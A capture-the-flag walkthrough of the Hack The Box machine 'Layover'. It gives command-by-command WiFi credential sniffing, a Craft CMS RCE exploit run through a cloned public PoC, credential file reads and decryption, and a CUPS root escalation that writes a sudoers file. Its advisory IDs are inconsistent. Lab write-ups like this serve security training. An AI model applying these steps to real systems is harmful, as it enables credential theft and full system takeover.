# HTB Layover — walkthrough & working scripts

**Difficulty:** Medium · Linux (Ubuntu) · Season 12 "Special Season: Aero"
**Note:** machine is still *active*, so public write-ups are gated. Treat the
credentials below as instance-dependent where they come from a database/backup —
you must derive them yourself.

> ⚠️ **Flags are per-instance** — never copy flag values from a write-up.

## Given starting credentials
```
contractor : Contractor2026!
```

## Services
| Port | Service |
|---|---|
| 22 | OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 |
| 3389 | RDP (`ms-wbt-server` / xrdp) |

The box is unusual: there is **no web server exposed on the target**. You RDP
into a **jumpbox** (`airside-ws01`) that has virtual WiFi interfaces, join an
open SSID, and sniff credentials off the air.

## Attack chain

```
RDP (contractor / Contractor2026!)  ->  jumpbox airside-ws01
  └─ sudo ALL + wireshark + netdev groups
       └─ wlan2: join open "HTB International WiFi"  ->  10.13.37.0/24
            └─ wlan3: monitor mode, tshark  ->  cleartext HTTP POST
                 └─ jenny : Fl1ghtDeck2026!   (portal.international.htb)
                      └─ Craft CMS 5.9.8  authenticated RCE
                         (Yii2 behavior injection, CVE-2026-44011)  -> www-data
                           └─ .env  ->  CRAFT_SECURITY_KEY + craftuser DB creds
                                └─ htbairways_settings -> aporter relay password
                                     └─ Yii2 Security::decryptByKey() -> aporter:<pw>
                                          └─ ssh aporter -> /home/aporter/user.txt  [USER]
                                               └─ CUPS 2.4.16 LPE
                                                  (CVE-2026-34990) -> sudoers
                                                    └─ /root/root.txt       [ROOT]
```

## Files

| File | Purpose |
|---|---|
| `01_rdp.sh` | RDP into the jumpbox + local enumeration checklist |
| `02_wifi_sniff.sh` | join the open WiFi, monitor mode, tshark capture + extract creds |
| `03_craft_rce.py` | prints the behavior-injection payload and runs the output listener |
| `04_decrypt_aporter.php` | Yii2 `decryptByKey` helper to unwrap the relay password |
| `05_cups_lpe.sh` | fetch + run the CUPS 2.4.16 LPE PoC |

## 1. RDP onto the jumpbox
```bash
sudo apt install -y freerdp2-x11          # or freerdp3-x11
xfreerdp /v:10.129.x.x /u:contractor /p:'Contractor2026!' \
         /cert:ignore /dynamic-resolution
# WSLg gives you a window; if not, add  /drive:.,share  and use /f
```
On the jumpbox (it is `airside-ws01`):
```bash
whoami; id
sudo -l
# contractor has: (ALL : ALL) ALL
# groups: sudo, netdev(111), wireshark(121)
```

## 2. Wireless pivot + credential sniffing
```bash
./02_wifi_sniff.sh
```
Manually:
```bash
sudo nmcli device wifi list
sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip a show wlan2                       # -> 10.13.37.182/24

sudo nmcli device set wlan3 managed no
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6

sudo tshark -i wlan3 -w /tmp/wifi.pcap            # let it run a few minutes
sudo tshark -r /tmp/wifi.pcap -Y 'http.request.method=="POST"' \
  -T fields -e ip.src -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value
```
Expected leak (captive portal login over plain HTTP):
```
10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
```

## 3. Craft CMS authenticated RCE (CVE-2026-44011)
- Target: `http://portal.international.htb` — Craft CMS **5.9.8**
- Advisory: GHSA-qrgm-p9w5-rrfw — affected 5.0.0–5.9.17, fixed 5.9.18
- Endpoint: `/admin/actions/element-search/search`
- Root cause: `condition` → `ElementCondition::createCondition()` without
  `Component::cleanseConfig()`, so Yii's `__class` / `as <behavior>` / `on <event>`
  object keys are honoured. Attaching `AttributeTypecastBehavior` with
  `Psy\Readline\Hoa\ConsoleProcessus::execute()` as the typecast callable gives
  shell execution. **Any account (even low-privilege) can do this.**

Use the public PoC (recommended — handles login + two-stage output capture):
```bash
git clone https://github.com/khush-613/cve-2026-44011-poc
python3 exploit.py -b http://portal.international.htb \
  -u jenny -p 'Fl1ghtDeck2026!' -c 'id' -H 10.13.37.182
```
`03_craft_rce.py` prints the hand-rolled payload + starts the listener if you
want to do it manually.

## 4. .env → DB creds → decrypt the relay password
```bash
cat /var/www/portal/.env
# CRAFT_SECURITY_KEY=<instance specific>
# CRAFT_DB_USER=craftuser
# CRAFT_DB_PASSWORD=CraftDB_pw_2026
# CRAFT_DB_DATABASE=craft

mysql -u craftuser -p'CraftDB_pw_2026' craft -e 'SELECT * FROM htbairways_settings'
# mailRelayUser      aporter
# mailRelayPassword  <base64 AES-128-CBC blob>

php 04_decrypt_aporter.php '<base64_blob>' '<CRAFT_SECURITY_KEY>'
```
Equivalent one-liner on the target:
```bash
php -r 'require "/var/www/portal/vendor/autoload.php";
        $s = new yii\base\Security();
        echo $s->decryptByKey(base64_decode($argv[1]), $argv[2]), "\n";' \
    '<base64_blob>' '<CRAFT_SECURITY_KEY>'
```
You now have `aporter : <relay password>`.

## 5. User flag
```bash
ssh aporter@<target-ip>          # password from step 4
cat ~/user.txt                   # <-- USER FLAG
```

## 6. Root — CUPS 2.4.16 LPE (CVE-2026-34990)
Fixed in 2.4.17 · advisory GHSA-c54j-2vqw-wpwp · discovers the local print-admin
token via a temporary printer, then reuses it to write an arbitrary root-owned
file (`/etc/sudoers.d/<user>-pwn`).
```bash
./05_cups_lpe.sh
# or manually:
git clone https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC
cd CVE-2026-34990-CUPS-LPE-PoC && python3 exploit.py
#   [+] Local token: <token>
#   [+] ROOT via sudoers
sudo -n bash
cat /root/root.txt               # <-- ROOT FLAG
```

## Tooling to install (WSL Kali)
```bash
sudo apt install -y freerdp2-x11 tshark iw net-tools \
                    mariadb-client php-cli python3-pip
pip3 install requests
```

## Sources
- https://bitr1ft.github.io/layover.html
- https://1337sheets.com/hack-the-box-htb-layover-writeup-medium-weekly-september-26th-2026/
- https://h3ykali.com/htb/layover
- https://github.com/craftcms/cms/security/advisories/GHSA-7jx7-3846-m7w7
- https://github.com/khush-613/cve-2026-44011-poc
- https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC
